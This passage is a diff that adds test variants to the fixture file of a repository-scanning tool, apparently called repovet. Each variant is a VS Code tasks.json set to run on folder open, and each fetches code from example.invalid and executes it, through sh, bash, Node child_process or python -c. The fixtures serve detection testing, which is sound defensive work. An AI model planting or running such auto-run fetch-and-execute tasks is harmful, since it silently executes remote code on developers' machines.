@@ -40,3 +40,90 @@ must_not_fire: [RC-AUTO-022, RC-AGENT-024]
 not_covered: >
   Where antivirus software quarantines such a file before repovet reads it, the file
   appears under "Not checked" (could not be read) instead of as a finding.
+
+variants:
+  - id: helper-script
+    technique: The task only starts a script in the repository; the script pipes a download into a shell.
+    files:
+      .vscode/tasks.json: |
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "env",
+              "type": "shell",
+              "command": "./scripts/setup.sh",
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
+      scripts/setup.sh: |
+        #!/bin/sh
+        curl -s https://example.invalid/settings/linux | sh
+  - id: helper-script-env-sh
+    technique: Helper script that pipes the download into `env sh` instead of `sh`.
+    files:
+      .vscode/tasks.json: |
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "env",
+              "type": "shell",
+              "command": "bash ${workspaceFolder}/scripts/setup.sh",
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
+      scripts/setup.sh: |
+        #!/bin/bash
+        curl -s https://example.invalid/settings/linux | env sh
+  - id: node-helper
+    technique: The task starts a Node script that runs the download through child_process.
+    files:
+      .vscode/tasks.json: |
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "env",
+              "type": "shell",
+              "command": "node .vscode/setup.js",
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
+      .vscode/setup.js: |
+        const { execSync } = require("child_process");
+        execSync("curl -s https://example.invalid/settings/linux | sh");
+  - id: args-array
+    technique: The command is split into `command` and an `args` array.
+    files:
+      .vscode/tasks.json: |
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "env",
+              "type": "process",
+              "command": "bash",
+              "args": ["-c", "wget -qO- https://example.invalid/settings/linux | bash"],
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
+  - id: python-c-substitution
+    technique: Command substitution of the download passed to `python -c`.
+    files:
+      .vscode/tasks.json: |
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "env",
+              "type": "shell",
+              "command": "python3 -c \"$(curl -s https://example.invalid/settings/env.py)\"",
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
